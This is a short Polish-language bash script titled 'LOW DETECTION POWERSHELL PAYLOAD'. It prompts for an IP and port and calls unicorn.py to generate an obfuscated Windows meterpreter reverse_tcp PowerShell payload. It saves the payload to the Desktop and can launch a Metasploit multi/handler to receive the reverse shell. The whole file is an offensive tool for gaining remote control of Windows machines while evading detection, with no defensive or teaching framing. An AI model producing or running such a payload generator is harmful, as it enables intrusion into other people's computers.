#! /bin/bash
# LOW DETECTION POWERSHELL PAYLOAD 
echo "
   ____________  _______ ______  _____  __  __ _____ ____ _______  __ 
  / __/ ___/ _ \/  _/ _ /_  __/ / _ \ \/ / / //_/ _ /_  /<  / __ \/ / 
 _\ \/ /__/ , __/ // ___// /   / _  |\  / / ,< / // // /_/ / /_/ / /__
/___/\___/_/|_/___/_/   /_/   /____/ /_/ /_/|_|\___//___/_/\____/____/

"
echo "Uruchamiam skrypt ..."
cd /home/kali/Desktop/metasploit/unicorn
echo "Podaj adres ip ładunku ..."
read IP
echo "Podaj port ładunku ..."
read PORT
./unicorn.py windows/meterpreter/reverse_tcp $IP $PORT
mv /home/kali/Desktop/METASPLOIT-BY-KOZIOL/unicorn/powershell_attack.txt /home/kali/Desktop
cd /home/kali/Desktop
echo "Czy mam uruchomić pakiet metasploit ? (Y/N)"
read ODPOWIEDZ
if [ $ODPOWIEDZ == "Y" ]
then
  echo "Uruchamiam skrypt... "
  sleep 3
  msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp'
else
  echo "Kończę działanie skryptu ..."
fi
